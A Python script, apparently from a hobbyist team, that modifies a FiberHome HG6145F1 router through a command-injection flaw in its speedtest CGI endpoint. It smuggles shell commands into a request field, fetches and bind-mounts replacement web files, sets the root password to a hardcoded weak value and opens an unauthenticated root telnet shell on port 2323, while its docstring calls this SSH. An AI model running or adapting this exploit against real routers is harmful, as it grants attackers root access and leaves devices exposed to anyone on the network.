#!/usr/bin/env python3
"""
FiberHome HG6145F1 — Auto Customizer
By Smothy / Numb Team

Usage:
  1. Upload custom-webui.bin via router Local Upgrade page
  2. Login to router admin panel
  3. Run: python3 customize.py

This script uses the RCE to:
  - Deploy custom dark login page (Smothy/Numb Team branding)
  - Replace green theme with blue
  - Set root password and start SSH
  - Apply all changes via bind mounts
"""

import hashlib
import http.server
import json
import os
import re
import sys
import threading
import time
import urllib.parse
import urllib.request

ROUTER_IP = "192.168.1.1"
ROUTER_URL = f"http://{ROUTER_IP}"
WEBUI_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "webui-files")
SERVER_PORT = 9999


def get_local_ip():
    """Get local IP on the router's subnet."""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((ROUTER_IP, 80))
        return s.getsockname()[0]
    finally:
        s.close()


def get_session_id():
    """Get a fresh session ID from the router."""
    url = f"{ROUTER_URL}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        data = json.loads(resp.read())
        return data.get("sessionid", "")
    except Exception:
        return ""


def rce(cmd):
    """Execute a command on the router via triger_speedtest RCE."""
    sid = get_session_id()
    if not sid:
        return False, "Failed to get session ID"

    url = f"{ROUTER_URL}/cgi-bin/ajax"
    body = f"ajaxmethod=triger_speedtest&url=;{cmd}&sessionid={sid}"
    req = urllib.request.Request(url, data=body.encode(),
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        text = resp.read().decode(errors="ignore")
        if '"session_valid":0' in text:
            return False, "Session invalid — are you logged in?"
        return True, text
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code} — WAF may have blocked the command"
    except Exception as e:
        return False, str(e)


def check_login():
    """Check if we're logged into the router."""
    url = f"{ROUTER_URL}/cgi-bin/ajax?ajaxmethod=get_login_user"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        data = json.loads(resp.read())
        return data.get("session_valid") == 1
    except Exception:
        return False


def check_rce():
    """Check if RCE is available (patched CGI deployed)."""
    ok, text = rce("echo ok")
    return ok and "ret" in text


def start_file_server(directory, port):
    """Start a simple HTTP server in the background."""
    os.chdir(directory)
    handler = http.server.SimpleHTTPRequestHandler
    handler.log_message = lambda *a: None  # suppress logs
    server = http.server.HTTPServer(("0.0.0.0", port), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def deploy_files(local_ip):
    """Deploy custom files to the router via RCE + wget."""
    base = f"http://{local_ip}:{SERVER_PORT}"
    files = [
        "html/login_inter.html",
        "css/mainLeft.css",
        "css/main_style.css",
        "css/index.css",
    ]

    for f in files:
        src = f"{base}/{f}"
        dst = f"/var/www-custom/{f}"
        cmd = f"wget -q {src} -O {dst}"
        ok, text = rce(cmd)
        status = "OK" if ok else "FAIL"
        print(f"  [{status}] {f}")

    # Re-apply bind mounts for changed files
    mounts = [
        ("html/login_inter.html", "html/login_inter.html"),
        ("css/mainLeft.css", "css/mainLeft.css"),
        ("css/main_style.css", "css/main_style.css"),
        ("css/index.css", "css/index.css"),
    ]
    for src, dst in mounts:
        rce(f"mount --bind /var/www-custom/{src} /www/{dst}")

    print("  [OK] Bind mounts applied")


def setup_root():
    """Set root password and start SSH."""
    print("  Setting root password...")
    rce("echo root:root123 | chpasswd")

    print("  Starting telnetd on port 23...")
    rce("telnetd -l /bin/sh -p 2323")

    print("  [OK] Root access ready")
    print(f"  Connect: telnet {ROUTER_IP} 2323")


def main():
    print("=" * 50)
    print("FiberHome HG6145F1 — Auto Customizer")
    print("By Smothy / Numb Team")
    print("=" * 50)

    # Check login
    print("\n[1/4] Checking router connection...")
    if not check_login():
        print("  FAIL — Not logged in. Login to the router first.")
        print(f"  Open http://{ROUTER_IP} and login as admin")
        sys.exit(1)
    print("  OK — Logged in")

    # Check RCE
    print("\n[2/4] Checking RCE access...")
    if not check_rce():
        print("  FAIL — RCE not available.")
        print("  Upload custom-webui.bin first via Local Upgrade")
        sys.exit(1)
    print("  OK — RCE available")

    # Deploy files
    print("\n[3/4] Deploying custom files...")
    local_ip = get_local_ip()
    print(f"  Serving files from {local_ip}:{SERVER_PORT}")

    if not os.path.isdir(WEBUI_DIR):
        print(f"  FAIL — webui-files/ directory not found")
        sys.exit(1)

    server = start_file_server(WEBUI_DIR, SERVER_PORT)
    time.sleep(1)
    deploy_files(local_ip)

    # Root access
    print("\n[4/4] Setting up root access...")
    setup_root()

    print("\n" + "=" * 50)
    print("DONE! Refresh http://{} to see changes".format(ROUTER_IP))
    print("=" * 50)


if __name__ == "__main__":
    main()
